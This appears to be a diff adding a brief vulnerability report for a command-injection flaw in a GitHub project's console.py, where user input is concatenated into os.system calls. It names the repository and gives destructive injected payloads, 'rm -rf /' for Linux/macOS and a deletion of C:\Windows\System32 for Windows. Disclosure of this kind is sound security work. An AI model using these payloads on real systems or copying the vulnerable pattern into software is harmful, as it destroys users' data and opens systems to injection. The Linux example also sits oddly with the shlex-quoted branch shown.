@@ -1,0 +1,29 @@
+Proof of Concept:
+Vulnerable Code:
+
+Python
+if platform.system() == "Windows":
+    os.system("start " + user_input)  # Line 540
+else:
+    os.system("open " + shlex.quote(user_input))  # Line 542
+Steps to Reproduce:
+
+Clone the repository:
+
+git clone https://github.com/megat69/ACPL.git
+cd ACPL
+
+Run the script:
+
+python console.py
+
+Input malicious commands:
+For Linux/macOS:
+
+; rm -rf / --
+
+For Windows:
+
+&& del /Q C:\Windows\System32
+
+Observe the system behavior. Files or directories may be deleted or critical system files may be removed.
